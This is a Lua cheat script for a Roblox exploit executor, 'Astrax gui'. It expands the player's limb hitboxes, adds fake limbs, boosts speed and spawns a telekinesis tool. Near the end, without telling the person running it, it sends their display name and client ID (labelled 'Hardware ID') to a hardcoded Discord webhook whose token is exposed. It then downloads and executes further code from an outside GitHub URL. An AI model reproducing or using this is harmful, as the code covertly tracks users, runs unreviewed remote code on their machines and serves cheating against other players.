local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()

local win = DiscordLib:Window("Astrax gui")

local serv = win:Server("Astrax | SBS", "")

local textbs = serv:Channel("Hitbox Expander")

textbs:Textbox("Both Leg Reach", "Type here!", true, function(t)
    game.Players.LocalPlayer.Character["Right Leg"].Size = Vector3.new(t, 2, t)
    game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new(t, 2, t)
    game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
    game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
    game.Players.LocalPlayer.Character["Right Leg"].Massless = true
    game.Players.LocalPlayer.Character["Left Leg"].Massless = true
end)

local textbs = serv:Channel("Leg Transparency")

textbs:Textbox("Leg Transparency/Right", "Type here!", true, function(l)
    game.Players.LocalPlayer.Character["Right Leg"].Transparency = l
end)

textbs:Textbox("Leg Transparency/Left", "Type here!", true, function(l)
    game.Players.LocalPlayer.Character["Left Leg"].Transparency = l
end)

local btns = serv:Channel("Fake Legs")

btns:Button("Fake Right Leg", function()
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer


    local solBacak = Player.Character["Left Leg"]
    local sagBacak = Player.Character["Right Leg"]


    local sahteBacak = Instance.new("Part")
    sahteBacak.Name = "Right Leg"
    sahteBacak.Size = Vector3.new(1, 2, 1) -- Bacak boyutunu ayarlayabilirsiniz
    sahteBacak.Transparency = 0 -- Bacak görünmez olacak
    sahteBacak.Parent = Player.Character


    local sahteBacakMotor6D = Instance.new("Motor6D")
    sahteBacakMotor6D.Name = "SahteSağBacakMotor6D"
    sahteBacakMotor6D.Part0 = Player.Character.Torso
    sahteBacakMotor6D.Part1 = sahteBacak
    sahteBacakMotor6D.C0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
    sahteBacakMotor6D.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0) -- Bacak pozisyonunu ayarlayabilirsiniz


    sahteBacakMotor6D.Parent = Player.Character.Torso

end)

btns:Button("Fake Left Leg", function()
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer
    
    
    local solBacak = Player.Character["Left Leg"]
    local sagBacak = Player.Character["Right Leg"]
    
    
    local sahteBacak = Instance.new("Part")
    sahteBacak.Name = "Left Leg"
    sahteBacak.Size = Vector3.new(1, 2, 1) -- Bacak boyutunu ayarlayabilirsiniz
    sahteBacak.Transparency = 0 -- Bacak görünmez olacak
    sahteBacak.Parent = Player.Character
    
    
    local sahteBacakMotor6D = Instance.new("Motor6D")
    sahteBacakMotor6D.Name = "SahteSolBacakMotor6D"
    sahteBacakMotor6D.Part0 = Player.Character.Torso
    sahteBacakMotor6D.Part1 = sahteBacak
    sahteBacakMotor6D.C0 = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
    sahteBacakMotor6D.C1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
    
    
    sahteBacakMotor6D.Parent = Player.Character.Torso

    end)

    local textbs = serv:Channel("Hand Reach")

    textbs:Textbox("Both Hand Reach", "Type here!", true, function(t)
        game.Players.LocalPlayer.Character["Right Arm"].Size = Vector3.new(t, t, 1)
        game.Players.LocalPlayer.Character["Left Arm"].Size = Vector3.new(t, t, 1)
        game.Players.LocalPlayer.Character["Right Arm"].CanCollide = false
        game.Players.LocalPlayer.Character["Left Arm"].CanCollide = false
        game.Players.LocalPlayer.Character["Right Arm"].Massless = true
        game.Players.LocalPlayer.Character["Left Arm"].Massless = true
    end)

    local textbs = serv:Channel("Arm Transparency")

    textbs:Textbox("Arm Transparency/Right", "Type here!", true, function(l)
        game.Players.LocalPlayer.Character["Right Arm"].Transparency = l
    end)
    
    textbs:Textbox("Leg Transparency/Left", "Type here!", true, function(l)
        game.Players.LocalPlayer.Character["Left Arm"].Transparency = l
    end)
    
    local btns = serv:Channel("Changer")

    btns:Button("Night Mode", function()
        local Lighting = game:GetService("Lighting")

        -- Gece ayarı
        Lighting.TimeOfDay = "1:00:00"
    end)

    local btns = serv:Channel("Misc")
    
        btns:Button("İnfinite Stamina For pc Rn [Keybind = C]", function()
local defaultSpeed = 16
local speed = 20
local animationId = "10327878358" -- Kullanmak istediğiniz animasyonun ID'sini buraya ekleyin

-- Düzenlenmemesi gereken kısımları aşağıda görebilirsiniz
_G.Speeding = false
local isSpeeding = false
local isKeyPressed = false

-- Animasyon nesnesini oluşturun
local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://" .. animationId

-- Animasyonu oynatabilmek için animasyon kontrolcüsü oluşturun
local animationController = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)

game:GetService("UserInputService").InputBegan:Connect(function(inputkey)
   if inputkey.KeyCode == Enum.KeyCode.C then
       isKeyPressed = true
   end
end)

game:GetService("UserInputService").InputEnded:Connect(function(inputkey)
   if inputkey.KeyCode == Enum.KeyCode.C then
       isKeyPressed = false
   end
end)

game:GetService("RunService").Heartbeat:Connect(function()
   if isKeyPressed then
       if not _G.Speeding then
           -- Hızı ayarla
           game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speed
           _G.Speeding = true

           -- Animasyonu oynat
           animationController:Play()
       end
   else
       if _G.Speeding then
           -- Hızı sıfırla
           game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = defaultSpeed
           _G.Speeding = false

           -- Animasyonu durdur
           animationController:Stop()
       end
   end
end)
    end)

            btns:Button("Telekinesis", function()
-- Q & E - bring closer and further
-- R - Roates Block
-- T - Tilts Block
-- Y - Throws Block
local function a(b, c)
    local d = getfenv(c)
    local e =
        setmetatable(
        {},
        {__index = function(self, f)
                if f == "script" then
                    return b
                else
                    return d[f]
                end
            end}
    )
    setfenv(c, e)
    return c
end
local g = {}
local h = Instance.new("Model", game:GetService("Lighting"))
local i = Instance.new("Tool")
local j = Instance.new("Part")
local k = Instance.new("Script")
local l = Instance.new("LocalScript")
local m = sethiddenproperty or set_hidden_property
i.Name = "Telekinesis"
i.Parent = h
i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
i.GripForward = Vector3.new(-0, -1, -0)
i.GripRight = Vector3.new(0, 0, 1)
i.GripUp = Vector3.new(1, 0, 0)
j.Name = "Handle"
j.Parent = i
j.CFrame = CFrame.new(-17.2635937, 15.4915619, 46, 0, 1, 0, 1, 0, 0, 0, 0, -1)
j.Orientation = Vector3.new(0, 180, 90)
j.Position = Vector3.new(-17.2635937, 15.4915619, 46)
j.Rotation = Vector3.new(-180, 0, -90)
j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
j.Transparency = 1
j.Size = Vector3.new(1, 1.20000005, 1)
j.BottomSurface = Enum.SurfaceType.Weld
j.BrickColor = BrickColor.new("Really black")
j.Material = Enum.Material.Metal
j.TopSurface = Enum.SurfaceType.Smooth
j.brickColor = BrickColor.new("Really black")
k.Name = "LineConnect"
k.Parent = i
table.insert(
    g,
    a(
        k,
        function()
            wait()
            local n = script.Part2
            local o = script.Part1.Value
            local p = script.Part2.Value
            local q = script.Par.Value
            local color = script.Color
            local r = Instance.new("Part")
            r.TopSurface = 0
            r.BottomSurface = 0
            r.Reflectance = .5
            r.Name = "Laser"
            r.Locked = true
            r.CanCollide = false
            r.Anchored = true
            r.formFactor = 0
            r.Size = Vector3.new(1, 1, 1)
            local s = Instance.new("BlockMesh")
            s.Parent = r
            while true do
                if n.Value == nil then
                    break
                end
                if o == nil or p == nil or q == nil then
                    break
                end
                if o.Parent == nil or p.Parent == nil then
                    break
                end
                if q.Parent == nil then
                    break
                end
                local t = CFrame.new(o.Position, p.Position)
                local dist = (o.Position - p.Position).magnitude
                r.Parent = q
                r.BrickColor = color.Value.BrickColor
                r.Reflectance = color.Value.Reflectance
                r.Transparency = color.Value.Transparency
                r.CFrame = CFrame.new(o.Position + t.lookVector * dist / 2)
                r.CFrame = CFrame.new(r.Position, p.Position)
                s.Scale = Vector3.new(.25, .25, dist)
                wait()
            end
            r:remove()
            script:remove()
        end
    )
)
k.Disabled = true
l.Name = "MainScript"
l.Parent = i
table.insert(
    g,
    a(
        l,
        function()
            wait()
            tool = script.Parent
            lineconnect = tool.LineConnect
            object = nil
            mousedown = false
            found = false
            BP = Instance.new("BodyPosition")
            BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
            BP.P = BP.P * 1.1
            dist = nil
            point = Instance.new("Part")
            point.Locked = true
            point.Anchored = true
            point.formFactor = 0
            point.Shape = 0
            point.BrickColor = BrickColor.Black()
            point.Size = Vector3.new(1, 1, 1)
            point.CanCollide = false
            local s = Instance.new("SpecialMesh")
            s.MeshType = "Sphere"
            s.Scale = Vector3.new(.7, .7, .7)
            s.Parent = point
            handle = tool.Handle
            front = tool.Handle
            color = tool.Handle
            objval = nil
            local u = false
            local v = BP:clone()
            v.maxForce = Vector3.new(30000, 30000, 30000)
            function LineConnect(o, p, q)
                local w = Instance.new("ObjectValue")
                w.Value = o
                w.Name = "Part1"
                local x = Instance.new("ObjectValue")
                x.Value = p
                x.Name = "Part2"
                local y = Instance.new("ObjectValue")
                y.Value = q
                y.Name = "Par"
                local z = Instance.new("ObjectValue")
                z.Value = color
                z.Name = "Color"
                local A = lineconnect:clone()
                A.Disabled = false
                w.Parent = A
                x.Parent = A
                y.Parent = A
                z.Parent = A
                A.Parent = workspace
                if p == object then
                    objval = x
                end
            end
            function onButton1Down(B)
                if mousedown == true then
                    return
                end
                mousedown = true
                coroutine.resume(
                    coroutine.create(
                        function()
                            local C = point:clone()
                            C.Parent = tool
                            LineConnect(front, C, workspace)
                            while mousedown == true do
                                C.Parent = tool
                                if object == nil then
                                    if B.Target == nil then
                                        local t = CFrame.new(front.Position, B.Hit.p)
                                        C.CFrame = CFrame.new(front.Position + t.lookVector * 1000)
                                    else
                                        C.CFrame = CFrame.new(B.Hit.p)
                                    end
                                else
                                    LineConnect(front, object, workspace)
                                    break
                                end
                                wait()
                            end
                            C:remove()
                        end
                    )
                )
                while mousedown == true do
                    if B.Target ~= nil then
                        local D = B.Target
                        if D.Anchored == false then
                            object = D
                            dist = (object.Position - front.Position).magnitude
                            break
                        end
                    end
                    wait()
                end
                while mousedown == true do
                    if object.Parent == nil then
                        break
                    end
                    local t = CFrame.new(front.Position, B.Hit.p)
                    BP.Parent = object
                    BP.position = front.Position + t.lookVector * dist
                    wait()
                end
                BP:remove()
                object = nil
                objval.Value = nil
            end
            function onKeyDown(E, B)
                local E = E:lower()
                local F = false
                if E == "q" then
                    if dist >= 5 then
                        dist = dist - 10
                    end
                end
                if E == "r" then
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            return nil
                        end
                    end
                    BG = Instance.new("BodyGyro")
                    BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    BG.cframe = CFrame.new(object.CFrame.p)
                    BG.Parent = object
                    repeat
                        wait()
                    until object.CFrame == CFrame.new(object.CFrame.p)
                    BG.Parent = nil
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            H.Parent = nil
                        end
                    end
                    object.Velocity = Vector3.new(0, 0, 0)
                    object.RotVelocity = Vector3.new(0, 0, 0)
                    object.Orientation = Vector3.new(0, 0, 0)
                end
                if E == "e" then
                    dist = dist + 10
                end
                if E == "t" then
                    if dist ~= 10 then
                        dist = 10
                    end
                end
                if E == "y" then
                    if dist ~= 200 then
                        dist = 200
                    end
                end
                if E == "=" then
                    BP.P = BP.P * 1.5
                end
                if E == "-" then
                    BP.P = BP.P * 0.5
                end
            end
            function onEquipped(B)
                keymouse = B
                local I = tool.Parent
                human = I.Humanoid
                human.Changed:connect(
                    function()
                        if human.Health == 0 then
                            mousedown = false
                            BP:remove()
                            point:remove()
                            tool:remove()
                        end
                    end
                )
                B.Button1Down:connect(
                    function()
                        onButton1Down(B)
                    end
                )
                B.Button1Up:connect(
                    function()
                        mousedown = false
                    end
                )
                B.KeyDown:connect(
                    function(E)
                        onKeyDown(E, B)
                    end
                )
                B.Icon = "rbxasset://textures\\GunCursor.png"
            end
            tool.Equipped:connect(onEquipped)
        end
    )
)
for J, H in pairs(h:GetChildren()) do
    H.Parent = game:GetService("Players").LocalPlayer.Backpack
    pcall(
        function()
            H:MakeJoints()
        end
    )
end
h:Destroy()
for J, H in pairs(g) do
    spawn(
        function()
            pcall(H)
        end
    )
end
    end)

HttpService = game:GetService("HttpService")
Webhook_Url = "https://discord.com/api/webhooks/1147153620442288270/ZrFkdfL3qm7xiZbl0iVcdi_15Rwj58hjQMT12iKEiNySLRAEwi-9p7QYrgPkuk145aAt"

local responce = request(
{
    Url = Webhook_Url,
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "*Scriptin execute edildi!*",
            ["description"] = game.Players.localPlayer.DisplayName.." has executed the Astrax SBS script.",
            ["type"] = "rich",
            ["color"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "Hardware ID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                }
            }
        }}
    })
}
)
    loadstring(game:HttpGet"https://raw.githubusercontent.com/Raspelx/-/main/b")()

win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")
